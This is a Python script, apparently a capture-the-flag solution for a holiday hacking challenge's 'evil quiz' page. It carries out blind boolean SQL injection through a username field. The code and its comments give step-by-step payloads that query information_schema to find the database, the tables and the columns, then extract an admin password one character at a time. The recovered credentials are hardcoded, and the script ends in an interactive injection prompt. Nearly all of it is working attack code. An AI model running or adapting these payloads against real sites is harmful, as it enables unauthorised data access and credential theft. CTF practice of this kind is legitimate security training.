import requests
import re
import string  


printables = string.printable[:66]+string.printable[67:] + string.printable[66]
printables = """'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$&\'()*+,-./:;<=>?@[\\]^`{|}~_ %"""

s = requests.Session() 
URL = "https://hackyholidays.h1ctf.com"
URL = "http://127.0.0.1:9090"

SET_USERNAME_URL = URL + "/evil-quiz"
TAKE_QUIZ_URL = URL + "/evil-quiz/start"
SCORE_URL = URL + "/evil-quiz/score"


def get_session():

	s.get(SET_USERNAME_URL, allow_redirects=False)
	r = s.post(SET_USERNAME_URL, data={"name":"test-get-session"}, allow_redirects=False)
	s.post(TAKE_QUIZ_URL, data={"ques_1":0,"ques_2":"0","ques_3":0}, allow_redirects=False)
	s.get(SCORE_URL,allow_redirects=False)
	print "[+] Session successfully created ", r.headers["Set-Cookie"]



def sqli(username):

	s.post(SET_USERNAME_URL, data={"name":username}, allow_redirects=False)
	r = s.get(SCORE_URL)	
	data =  re.search("There is (.*) othe", r.text)
	if data:
		print data.group(1)
		return data.group(1)
	else:
		print "ERROR nothing found", r.text


def find_database(length):
	db = "quiz"

	while len(db) != length: 
		for word in printables:
			print ("Trying ", db + word)
			inject = "1' or database() like '{}%'#".format(db + word)
			is_success = sqli(inject)
			if is_success != "0":
				db = db + word
				print ("Found ", db)
				break

	print ("Database ", db)
	return db

def find_table(length, table_number=0):
	table = ""

	while len(table) != length: 
		for word in printables:
			print ("Trying ", table + word)
			inject = "1' OR (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {},1) like '{}%'#".format(table_number, table + word)
			is_success = sqli(inject)
			if is_success != "0":
				table = table + word
				print ("Found ", table)
				break

	print ("table ", table)
	return table


def leak_value(tablename, columnname, length):
	value = ""

	while len(value) != length:
		for word in printables:
			print ("Trying ", value + word)
			inject = "1' OR (select ascii(substring({}, {}, 1)) from {}) = {} #".format(columnname, len(value)+1, tablename, ord(word))
			is_success = sqli(inject)
			if is_success != "0":
				value = value + word
				print ("Found ", value)
				break
	
	print ("value", value)
	return value

get_session()

#  1' or length(database()) = 4 # we get db size = 4
database = find_database(4) # database = quiz

# Number of tables = 2
# 1'+OR+(SELECT+COUNT(*)+FROM+information_schema.tables+WHERE+table_schema=database())=2# 

# Length of first table = 5
# name=1'+OR+(SELECT+LENGTH(table_name)+FROM+information_schema.tables+WHERE+table_schema=database()+LIMIT+0,1)=5#

table = "admin" or find_table(5) # table = admin

# Number of columns = 3
# name=1' OR (select count(column_name) from information_schema.columns where table_schema=database() and table_name='admin')=3#

# Length of 1st column = 2 (probably "id")
# name=1' OR (select length(column_name) from information_schema.columns where table_schema=database() and table_name='admin' limit 0,1)=2#
column_1 = 'id'
# name=1' OR (select column_name from information_schema.columns where table_schema=database() and table_name='admin' limit 0,1) like 'id'#
# Guess was correct it was id

# -----

# Length of 2nd column = 8 (probably "username")
# 1' OR (select length(column_name) from information_schema.columns where table_schema=database() and table_name='admin' limit 1,1)=8#

column_2 = 'username'
# name=1' OR (select column_name from information_schema.columns where table_schema=database() and table_name='admin' limit 1,1) like 'username'#
# Guess was correct it was username

# ----
# Length of 3rd column = 8 (probably "password")
# 1' OR (select length(column_name) from information_schema.columns where table_schema=database() and table_name='admin' limit 2,1)=8#
column_3 = 'password'
# name=1' OR (select column_name from information_schema.columns where table_schema=database() and table_name='admin' limit 2,1) like 'password'#
# Guess was correct it was password

# -------------------

# length of username in admin table = 5 (probably "admin")
# name=1' OR (select length(username) from admin)=5#
username = "admin"
# guess was correct. The username is admin 
# name=-1' OR (select username from admin)="admin"#

# length of password in admin table = 17 (DEFINATELY CANT GUESS THIS)
# name=1' OR (select length(password) from admin)=17#
password = "S3creT_p4ssw0rd-$" or leak_value(table, column_3, 17)

print ( "Username = {} and password = {}".format(username, password))

while 1:
	sqli(raw_input("> "))




